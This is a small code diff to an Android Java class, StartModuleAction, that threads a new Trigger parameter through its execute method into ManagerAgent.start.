@@ -11,6 +11,7 @@ package com.android.service.action;
 
 import org.json.JSONObject;
 
+import com.android.service.Trigger;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfAction;
 import com.android.service.manager.ManagerAgent;
@@ -38,13 +39,13 @@ public class StartModuleAction extends ModuleAction {
 	 * @see com.ht.AndroidServiceGUI.action.SubAction#execute()
 	 */
 	@Override
-	public boolean execute() {
+	public boolean execute(Trigger trigger) {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (execute): " + moduleId) ;//$NON-NLS-1$
 		}
 		final ManagerAgent agentManager = ManagerAgent.self();
 
-		agentManager.start(moduleId);
+		agentManager.start(moduleId, trigger);
 		return true;
 	}
 
